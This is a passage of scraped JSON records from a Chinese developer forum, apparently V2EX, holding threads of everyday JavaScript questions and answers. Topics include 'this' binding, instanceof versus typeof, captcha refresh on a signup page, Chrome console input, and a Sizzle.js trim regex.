我就明白了你为什么疑惑了。\r", "你这样是想不通的。\r", "请忘掉传统的 OOP ，进入 prototype 的世界。", "this 不会丢失， this 永远指向 context ， this 不会指向「当前对象」。", "var gTag = document.getElementsByTagName;\r", "这一句只是将 getElementsByTagName 这个方法引用赋值给 gTag\r", "而 js 里是方法执行时确定上下文对象的，当你执行这个方法时，会查找上下文对象，而这里明显缺乏一个上下文对象\r", "\r", "错误提示是 getElementsByTagName 的上下文对象必须是 document 或集成 document 的\r", "你可以这样:\r", "\r", "var gTag = function (tagName ){\r", "  return document.getElementsByTagName (tagName );\r", "};\r", "gTag ('p');\r", "\r", "或者这样：\r", "\r", "var gTag = document.getElementsByTagName.bind (document );\r", "gTag ('p');", " 是这么回事", " [var a = object.method 会丢失 this ] \r", "并不是丢失了 this ：\r", "\r", "var a = {a:function (){console.log (this );}};\r", "var b = a.a;\r", "a.a ();\r", "b ();\r", "\r", "this 一直都在，只是这个 function 的运行环境改变了", "然后 call  o.run.call (New ) 实现了什么 实现了一个 \r", "\r", "让 run 这个方法运行的时候作用域 this 指向了 New ，所以 那个地方的 this.name 也就是 \"new name\"", "问题一：像 @", " 所说的， Js 自带的方法要考虑上下文， document.getElementsByTagName 必须绑在全局上。\r", "另外扩展 Js 本身的一些方法一般是重新定义一下：比如像一些 ie 兼容的扩展方法等\r", "var gTag = function (tagName ){ \r", "return document.getElementsByTagName (tagName ); \r", "}; \r", "gTag ('p'); \r", "\r", "\r", "问题二：两个关注点：\r", "1.prototype 和 call\\apply\r", "function Old (){}\r", "\r", "Old.prototype = {\r", "    name: \"old name\",\r", "    run: function (){\r", "        console.log (\"Name is: \" + this.name );\r", "    }\r", "}\r", "\r", "var o = new Old;\r", "\r", "var New = {\r", "    name: \"new name\"\r", "};\r", "\r", "o.run (New ); // Name is (old old old )/3 遍 name\r", "//o.run 并没有接受参数的地方，你应该要写成 o.run.call (New );吧？\r", "//1. o.run (New ); 打印 old name 的原因是 o.run o 从类 Old 定义而来，而 Old 的 prototype.name = “ old name ”;\r", "//2. 若你本意是 o.run.call (New )  则打印  Name is new name  此处指针会指向 New 对象。", "你可以用 bind 把上下文绑定在方法上啊 \r", "\r", "var run = o.run.bind (o )\r", "\r", "run ();", "对 JS 语法有任何疑问去看语言 spec 是最简单的办法， es6 有点厚就算了，大部分特性去看薄薄的 es3 标志就好了。", "js 作用域链", "OwO 不明觉厉"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>顺便查了下 instanceof 的原理。暂时没发现这样判断有什么问题……</p>\n</div></div>"], "reply": "23", "tittle": "JavaScript 里面使用 instanceof 来判断变量是否为 function，这种用法有什么问题么？看到用的不多。。。", "comment": ["typeof", "我用 typeof", " \r", " \r", "我知道有 typeof ，但是为什么大家不用 instanceof 呢？ typeof 跨浏览器很多问题的", "可以看看 underscore 或 lodash 的实现方式", " ", " 好吧……强行改变隐型原型……这个算一条", "还有个反向的例子\r", "\r", " \r", "\r", "浏览器里不高兴找哪里有 util.inherits 了就用了 node", "跨 context 比如 iframe", "  typeof 跨浏览器有什么问题？\r", "\r", "另外改__proto__不算一条，这个根本不应该改，该出错了就错了呗。\r", "\r", "虽然我觉得两个都可以，不过语义上显然 typeof 更合理，虽然 function 确实也是对象，但 instanceof 语义上应该是确定普通对象的类型，而不是像这样用在确定 function 上，毕竟 function 已经被“虚拟”成一种高于对象的类型了（所以 typeof func === \"function\"），实在没办法的类型比如 Date 才应该用 instanceof 或者 Object.prototype.toString.call", " 我去看下 util.inherits", " 你再 IE 8 及以下试下 alert (window.open )", "instanceof 判断左是不是右的一个实例，或者左是不是从右继承来的，判断依据是 左.__proto__===右.prototype\r", "typeof 检查变量的类型，等同于强类型语言的变量类型自举。\r", "明显，这 2 个语义是完全不同的。\r", "\r", "是一个 function 的实例，它未必是一个 function 类型。\r", "是一个 function 类型，它一定（默认）是从 Function 继承的。\r", "\r", "\r", " 你的例子， MyFunction 是一个 constructor ， b 是 MyFunction 的一个实例，这个 constructor 只是构造了一个普通的 object 就是 b 但它不是一个 function 类型，但却是从 MyFunction 分娩来的，所以 instanceof 一定是真。", " \r", " \r", "是不是可以这么理解？\r", "MyFunction.prototype = Function;\r", "b = new MyFunction\r", "因为这时：\r", "b.__proto__.__proto__ === MyFunction.prototype === Function\r", "所以导致 instanceof 无法真实反映 b 的类型？", " instanceof 反应的结果哪里有问题？（如果没有修改__proto__等私有属性的话）\r", "\r", "b is a instance of MyFunction\r", "MyFunction extends from Function\r", "Function extends from Object\r", "\r", "所以， b instanceof MyFunction====true\r", "b instanceof Function====true\r", "b instanceof Object====true\r", "但是， b is not a Function", " sorry,b instanceof Function====false 因为 b.__proto__ ==== {} object\r", "而 Function.prototype=Function\r", "instanceof 判断依据是 左.__proto__===右.prototype 并且不断向上递推直到左的.__proto__是 null", " 明白了\r", "一般的函数字面量表示的函数它们已经是 Function 的实例了，他们的直接 prototype 指向的不是 Function ，在此基础上构造出的新实例的__proto__指向的也不是 Function ，所以 instanceof 不是 Function\r", "\r", "然而按照上面的修改，改变了 MyFunction 的 prototype 指向， instanceof 从功能上讲是准确的\r", "\r", "其实我的意思是 b 在这个时候从意义上讲更应该是一个 object ，而且 typeof b 也是“ object ”，我觉着这个时候用 instanceof 判断 b 的“类型”就不准确了", " 没 IE8 及以下，不能直接说一下吗……\r", "\r", "完全看不懂后面你们在说啥了……\r", "\r", "MyFunction.prototype = Function; \r", "\r", "这个基本没有意义不大会有人这样做吧？毕竟 function 是特殊对象……", " 是的，实际上对 instanceof 的判断就是要从左.__proto__===右.prototype 来是准确的。\r", "因为如果继承是用父构造方法 apply 的方式，此时 instance.__proto__是自己的构造方法的（这是被 new 设值的），不会等于父构造方法，也就是说 instance 除了 instaceof 自己构造方法是 true 就剩下 Object 是 true 了，中间继承链上的父、爷等不会 true.\r", "如果是用 prototype 方式继承的，那么父、爷的 prototype 被继承时人为修改了，在左.__proto__===右.prototype 的判断中是相等的，那么就会有不光是自己构造方法的 isinstanceof==true 还会有中间链上的 isinstanceof==true 了，此时 instanceof 的效果就类似于普通面向对象语言的 isinstanceof 的语义了。", " 低版本 IE 中 native functions 的 typeof 的结果不是“ function ”而是“ object ”", "原来如此。不过 native function 本来就不大会用上 typeof 吧。", "好像 Object.prototype.toString.call () 很少有人使用", "Object.prototype.toString.call ()是最完美的判断方法， instanceof 如果原型中修改了，就不准了； typeof 再检测 Object 的时候，正则，数组，日期，等所有的都是返回 Object ，不精确；\r", "上面的方法也可以用 Object 的实例来代替，比如[].toString.call ()"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://imperavi.com/kube/tools/js-message/\" rel=\"nofollow\">http://imperavi.com/kube/tools/js-message/</a>\r<br>\r<br>不想使用 CSS 框架，希望有独立出来的组件。</div>"], "reply": "5", "tittle": "类似此效果的 JavaScript 提示框组件？", "comment": ["position: fixed;", "这个啊，给你我收藏的这个\r", "我比较喜欢\r", "\r", "和\r", "\r", "下面这个是国人写的。", "Toastr", "CSS 本身没什么难的，如 1 楼所说 position:fixed 就差不多了\r", "JS 部分要考虑得完善些，比如单击页面任意位置隐藏通知气泡什么的"]},
{"content": "", "reply": "19", "tittle": "Ubuntu 下开发，有什么工具能模拟 IE？", "comment": ["虚拟机", "虚拟机 browserstack", "同在 Ubuntu 下. 使用另一台电脑测试 IE 兼容性.", "微软提供各种虚拟机 ", "楼上那个是英文的，如果网站是中文的太麻烦\r", "虚拟机，自己下载个 XPsp3 的 ISO ，装好一个，复制三份， IE6 、 7 、 8 都有了", "我能说 CrossOver 么...", "vmware 啊...", "远离 ie ，微软自己都放弃 ie 了，新一代浏览器将兼容 chrome", "虚拟机 + ietester", " 9 10 11 呢", " 不是公司需要谁会兼容呢。。。肯定是迫不得已的", " 9 以上不用测试", "  众多银行网站和政府网站可还没放弃。", " 不要想当然，不管是 IE10 还是 IE11 和 chrome/firefox 的细微区别都还是有的。", " 你要测成所有浏览器浏览都一摸一样那也没办法", " 不是一模一样的要求，而是有些行为不一致的问题。\r", "比如 IE10 下设置 css background:transparent 的话 div 遮住的部分鼠标事件都会透过去，其他浏览器不会。\r", "这些细微区别有可能会引起 bug 的。", "可以用谷歌浏览器的插件， ", " 巨硬简直太给力了！", " MS 给的 VM 镜像， win7,win8 自己用 windows update 安装中文包即可切换到全系统中文环境。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>小弟我最近正在用 Canvas 解析 Android 的.9.png 格式的图片。<br>\n在遇到拉伸区域的时候，我尝试过两种方案，<br>\n方案一： 取拉伸区域的第一行像素（或第一列），按照要拉伸的距离进行复制添加，<br>\n方案二： 直接把整个要拉伸的区域导出成 png 格式的图片，再利用 Canvas 的 drawImage ()方法指定绘制的图片长宽来实现，</p>\n\n<p>还有一个是人家提到的平均差值算法，不知道有没有人试过或者有更好的解决方案。</p>\n</div></div>"], "reply": "3", "tittle": "canvas 解析.9.png", "comment": ["你去看看 android 源代码是怎么做的不就知道了吗？", "我怎么感觉你的第一种方案其实就是平铺呢，还有如果你用的是 HTML5 里的 canvas  人家自带拉伸，请认真看 API", " 我只是一个前端小菜鸟，待我去看 Android"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如何编写 pac 文件才能使之放在服务器上持续为手机提供 ss 服务？（非局域网的情况）<br>\n我的疑问是 pac 中是否可以加设密码？怎样用 ss 为 ios 端提供持续稳定的服务呢？不停打开那个 app 受不了啊，抓狂。。。</p>\n</div></div>"], "reply": "4", "tittle": "求助！ proxy PAC 文件的疑问", "comment": ["直接在连接上的 wifi 或者 4g 网络中设置自动代理就行，不用装第三方 app ；另外， pac 不支持密码", " ss 本身没有 pac 文件，如果不通过客户端如何生成呢？", "自行编写，或者使用别人写好，或使用别人的生成脚本", "用工具生成一个吧，可以参考 "]},
{"content": "", "reply": "2", "tittle": "有没有一些值得学习的 ES6 前端代码？", "comment": ["Bootstrap 4 alpha", "虽然不是代码，不过 Airbnb 的 ES6 Style Guide 很值得一读。\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Only 12kb gzipped, no dependencies</p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://lhorie.github.io/mithril/\">https://lhorie.github.io/mithril/</a><br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"https://lhorie.github.io/mithril/benchmarks.html\">https://lhorie.github.io/mithril/benchmarks.html</a><br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"https://lhorie.github.io/mithril/comparison.html\">https://lhorie.github.io/mithril/comparison.html</a></p>\n\n<p>毕竟 个头儿 小的没法比</p>\n\n<p>案例: <a target=\"_blank\" rel=\"nofollow\" href=\"http://discuss.flarum.org/\">http://discuss.flarum.org/</a></p>\n</div></div>"], "reply": "14", "tittle": "各位前端潮人，有人玩 mithril 吗？", "comment": ["已经在一个项目中用上了。 API 很简单，用法很灵活。", "我大 react 性能那么差?", "很早就关注了\r", "苦于没有什么机会可以尝试...", "我擦，这么牛逼！好好看看。", "Mithril.js 入门介绍 ", "0 0 好像很厉害的样子！", "看了一下，感觉还不错！", "好厉害的感觉", "看起来不错，从这个开始接触 js 的 MVC 框架可以吗？", "为什么要写这么难读的代码。。。", " 推荐用 backbone 这个东西用了会养成坏习惯 命名和代码组织比较难读 思路并不一目了然 容易把若干个简单的问题堆到一起复杂化", " 推荐用 backbone 这个东西用了会养成坏习惯 命名和代码组织比较难读 思路并不一目了然 容易把若干个简单的问题堆到一起复杂化", "看起来 好厉害~", "不明觉厉"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>用 ecstore 搭建的网店，注册页面如下图：<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"http://i.imgur.com/PZb51vQ.png\">http://i.imgur.com/PZb51vQ.png</a></p>\n\n<p>如果输入了错误的图形验证码并点击“获取短信验证码”，原来的图形验证码不会自动刷新，短信平台商说这样不科学，不给提供发短信服务。</p>\n\n<p>所以求懂前端童鞋帮忙处理一下这个问题，移动端注册页面也有同样的需求，理论上可以同理一并解决，搞定之后会有一些现金感谢。</p>\n\n<p>网址就不贴了，有兴趣的童鞋请加我微信 yixtan 了解更多。</p>\n</div></div>", "<div class=\"topic_content\">我 js 0 基础，你们说的我都不懂，¥300 现金求愿意动手的童鞋帮个忙，有兴趣的请加微信。</div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>PC 端： <a target=\"_blank\" rel=\"nofollow\" href=\"http://shop.aishicai.com/passport-signup.html\">http://shop.aishicai.com/passport-signup.html</a><br>\n移动端： <a target=\"_blank\" rel=\"nofollow\" href=\"http://shop.aishicai.com/wap/passport-signup.html\">http://shop.aishicai.com/wap/passport-signup.html</a></p>\n\n<p>谢谢各位</p>\n</div></div>"], "reply": "29", "tittle": "有偿求助，注册页面的图形验证码刷新", "comment": ["发送短信请求前  ajax 验证下验证码   失败刷新验证码图片   成功继续发送短信请求\r", "不难啊  难道我理解错了？", "目前的验证码点击会刷新不？这样的话短信验证失败后， js 模拟点击验证码不就可以了。如果现在的验证码也不能刷新，那当我没说", " 手工点击验证码可以刷新，问题出在我不懂怎么 js 模拟点击。", " 我也认为不难，但是我不懂 js 。", "看不到图片。", "可以绑定一个失焦事件，采集你验证码输入框的文本用 ajax 发送后台验证，如果错误提示框显示“验证码错误”刷新验证码呗\r", "或者可以直接表单提交，如果验证不通过（不管验证码还是密码）统统重新生成验证码发过来不就好了么", "jquery 的话， trigger 一下验证码的 click 事件就行了。", "你直接贴代码，免费就帮你解决了，你这样扭扭捏捏，出 300 块也不一定有人干", " 真的不是扭捏，是我实在不知道该贴哪一段代码，发网站又好像在做广告", "最后发个链接出来好测试", "外联的元素不用 ajax ，你用 javascript 更改一下 img 的 url 就行，随机加一个 Date.now 或者 Math.random ()都可以，浏览器就会去请求", "表示没看到获取短信验证码的东西", "现在不是可以了么", " 用户名填一个手机号码，就看到了", "如果被免费解决，建议将 300 元改成红包，贴这里，大家抢一下 233", "300 快我来了", " 输一个错的图形验证码，提示错误之后还是原来的码，运营商说这样不行，要刷新一次。", " 这个提议好\r", "\r", " 快点发红包", "为什么我这边不是  我输入的是错误的，提示之后就换了", "看了下代码大概在#298\r", "对返回的错误时 修改一下图片的 src 属性", " 这里如何贴红包？", "trigger 一下“看不清楚?换一个”", "passport-signup.html\r", "\r", "function sendVerify (el, data ) {\r", "    var url = el.href;\r", "    var textCont = el.getElement ('span span');\r", "    el.addClass ('disabled');\r", "    textCont.innerHTML = el.get ('text') + '(<i>0</i>)';\r", "    var cd = new countdown (textCont.getElement ('i'), {\r", "        start: 120,\r", "        secondOnly: true,\r", "        callback: function (e ) {\r", "            el.removeClass ('disabled');\r", "            textCont.innerHTML = '重发验证码';\r", "        }\r", "    });\r", "    Query.send (url, el, data, function (rs ) {\r", "        if (rs.error ) {\r", "            changeCode (Module.element (modname, 'img.auto-change-verify-handle'));\r", "            cd.stop ();\r", "            el.removeClass ('disabled');\r", "            textCont.innerHTML = '重发验证码';\r", "        }\r", "    });\r", "}", "手机界面 可以这样 　　手机界面还验证码本身就有 bug\r", "sendVerify  函数 rs.error 后面+上下面 3 行  （ FF +chrome 测试过）　　\r", "var newImage = new Image ();\r", "newImage.src = $(\".auto-change-verify-handle\").attr (\"src\")+\"?time=\"+new Date ();\r", "$(\".auto-change-verify-handle\").attr ('src', newImage.src );", "手机界面换验证码本身就有 bug", "感谢第一位和第二位加我微信并帮我完美解决问题的两位同学。\r", "同时也感谢其他在本贴中提供方法和思路的好同学们。", "来晚了,我的 300 红包啊", "来晚了。哈哈哈\r", "在“点击获取短信验证码”的时候先 ajax 校验验证码是否正确，如果不正确，执行刷新验证码的方法（不一定要想到去模拟点击）", "模拟点击。。和不刷新有什么区别.. 禁止 JS 后不一样没效果。。又多一个短信轰炸接口。"]},
{"content": ["<div class=\"topic_content\">在 Console 面板下，例如输入以下代码：\r<br>\r<br>function Car (color, title ){\r<br>   this.color = color;\r<br>   this.title = title;\r<br>   if (typeof Car._initialized == \"undefined\") {\r<br>      Car.prototype.start = function (){\r<br>          alert (\"Bang!!!\");\r<br>      };\r<br>      Car.prototype.material = \"steel\";\r<br>      Car._initialized = true;\r<br>   }\r<br>}\r<br>\r<br>上面代码的每一行结束，开始下一行的时候，需要按下 shift 键，才能保持代码连续性，请问是不是可以在哪里设置一下，可以不用按下 shift ，保持代码的连续性。</div>"], "reply": "5", "tittle": "Chrome 开发者工具中的 console，怎么做到换行不用按下 shift 键？", "comment": ["在编辑器里写好了贴进 console 里不就好了", "Chrome 没有多行模式。", "楼主可以用 IE 和 Edge 的控制台，记得展开后回车换行。", " 按住 shift 按回车就是多行了 楼主都提示你看还说没有", "按个 shift 有这么累吗"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>百度的经纬度好像是精确到街道的，如果我的地址信息只精确到市一级，这样怎么获取百度地图的经纬度？</p>\n</div></div>"], "reply": "1", "tittle": "百度 lbs 经纬度问题", "comment": ["他们有 geo 接口。有城市 id 。"]},
{"content": ["<div class=\"topic_content\">Json 文件地址： <a target=\"_blank\" href=\"http://liuyong.mayiduanz.com/www/a.txt\" rel=\"nofollow\">http://liuyong.mayiduanz.com/www/a.txt</a>\r<br>\r<br>PS：是自己想学习一下。\r<br>\r<br>谢谢！</div>"], "reply": "2", "tittle": "寻简洁读取一个 Json 文件的写法", "comment": ["为啥保存的后缀是 txt..........\r", "用 nodejs 最简单把  直接 require 这个 json 就完了。。。", " 那个网站，后缀 Json 的话，就无法读出了。\r", "\r", "想知道用 JavaScript 的话，应该怎么写。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><div class=\"highlight\"><pre><span class=\"nx\">whitespace</span> <span class=\"o\">=</span> <span class=\"s2\">\"[\\\\x20\\\\t\\\\r\\\\n\\\\f]\"</span>\n<span class=\"nx\">rtrim</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nb\">RegExp</span> <span class=\"p\">(</span> <span class=\"s2\">\"^\"</span> <span class=\"o\">+</span> <span class=\"nx\">whitespace</span> <span class=\"o\">+</span> <span class=\"s2\">\"+|((?:^|[^\\\\\\\\])(?:\\\\\\\\.)*)\"</span> <span class=\"o\">+</span> <span class=\"nx\">whitespace</span> <span class=\"o\">+</span> <span class=\"s2\">\"+$\"</span><span class=\"p\">,</span> <span class=\"s2\">\"g\"</span> <span class=\"p\">)</span>\n<span class=\"c1\">//即 /^[\\x20\\t\\r\\n\\f]+|((?:^|[^\\\\])(?:\\\\.)*)[\\x20\\t\\r\\n\\f]+$/g</span>\n</pre></div>\n\n<p>用法大概是 str.replace (rtrim,'$1');<br>\n作用是去除前后的空白符。</p>\n\n<p>关于这个正则不太理解。搜索了下也没找到答案。 [可能关键词不对。<br>\n目前我的理解是分为<br>\n^[空白符]+  部分和  <code>((?:^|[^\\\\])(?:\\\\.)*)[\\x20\\t\\r\\n\\f]+$</code>部分。<br>\n比如字符串<code>'__v2ex__'  //_替代空格了</code><br>\n匹配时<br>\n前面两个空格<code>'__'</code>被^[空白符]+匹配,结束匹配，由于没有分组，这部分被空替换。<br>\n由于 g ，继续从 v 开始匹配，至结尾被<code>((?:^|[^\\\\])(?:\\\\.)*)[\\x20\\t\\r\\n\\f]+$</code>匹配。<code>((?:^|[^\\\\])(?:\\\\.)*)</code>匹配 V2EX  [大概。。] ,v2ex 替换原字符串。<br>\n得到结果。</p>\n\n<p>但<code>((?:^|[^\\\\])(?:\\\\.)*)</code>这部分实在不能理解。<br>\n有人能帮忙解释一下吗？  万分感谢。</p>\n\n<p>另外：<br>\n1. 为什么不用<code>str.replace (/(^\\s*)|(\\s*$)/, \"\")</code>这种容易理解的方式？ 两者有什么区别？<br>\n2. <br>\nchrome 控制台运行结果为：<br>\n<code><br>\n'__\\\\__'.replace (rtrim,\"$1\")  //_替换空格<br>\n\"\\_\"<br>\n</code><br>\nnode 同一条语句运行结果为：<br>\n<code><br>\n'\\\\_'<br>\n</code><br>\n又是为什么呢？</p>\n\n<p>谢谢谢谢谢谢。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "请教个 Sizzle.js 里 rtrim 这个正则。", "comment": []}
]